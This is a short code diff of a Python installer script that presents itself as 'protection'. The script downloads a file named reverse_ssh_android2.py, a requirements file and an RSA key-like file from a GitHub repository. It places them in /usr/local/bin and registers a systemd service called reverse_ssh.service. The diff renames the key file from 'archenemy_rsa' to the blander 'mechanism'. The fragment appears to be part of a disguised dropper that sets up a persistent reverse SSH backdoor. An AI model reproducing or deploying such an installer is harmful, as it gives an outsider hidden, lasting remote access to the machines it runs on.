@@ -9,7 +9,7 @@ import subprocess
 # Define URLs for downloading the necessary files
 repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
-contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/archenemy_rsa"
+contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
 
 # Define the output file paths
@@ -17,7 +17,7 @@ envPath = "/usr/local/bin/protectionEnv"
 pythonPath = "/usr/local/bin/protectionEnv/bin/python3"
 repoFilePath = "/usr/local/bin/reverse_ssh_android2.py"
 requirementsFilePath = "/usr/local/bin/requirements.txt"
-contentFilePath = "/usr/local/bin/archenemy_rsa"
+contentFilePath = "/usr/local/bin/mechanism"
 serviceFilePath = "/etc/systemd/system/reverse_ssh.service"
 
 # Function to download a file and save it locally
